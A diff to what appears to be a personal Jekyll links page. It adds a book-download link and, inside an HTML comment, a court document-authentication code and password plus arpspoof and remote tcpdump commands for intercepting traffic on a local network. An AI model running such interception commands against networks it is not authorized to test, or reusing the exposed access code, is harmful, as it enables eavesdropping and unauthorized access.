@@ -60,7 +60,7 @@ English For You:| [YouTube](https://www.youtube.com/channel/UCaUajKAl3cpGQ6KARpn
 
 -------------------|----------------------------------------------------------------------------------------------------------------
 News :| [cnet.com](https://www.cnet.com/news/)
-
+Literatura:| [clarice-lispector](https://farofafilosofica.com/2018/01/10/clarice-lispector-19-livros-para-download-em-pdf/)
 
 ### Material de referencia Jekyll
 
@@ -88,6 +88,8 @@ App's: | [Lista de App's](https://codewizardshq.com/coding-for-kids-free/)
 
 
 <!-- 
+
+https://vercel.com/dashboard/domains
 
 ### _config.yml
 > Code block will look like this.
@@ -190,5 +192,18 @@ date_format: "%Y-%M-%D" //and date format.
 </tbody>
 </table>
 
+http://www.stf.jus.br/portal/autenticacao/autenticarDocumento.asp sob o código 7606-03ED-5F49-A3FE e senha AABF-0FD7-C36A-1F68
+
+
+
+
+arpspoof -i enp0s3 -t 10.0.0.1 10.0.0.104 &> /dev/null
+
+arpspoof -i enp0s3 -t 10.0.0.104 -r 10.0.0.1 &> /dev/null
+arpspoof -i enp0s3 -t 10.0.0.1 -r 10.0.0.104 &> /dev/null
+
+ssh -t valadares@10.0.0.108 "tcpdump -s 0 -n -w - -U -i enp0s3 not port 22" > /tmp/remotecapture
+
 
 -->
+
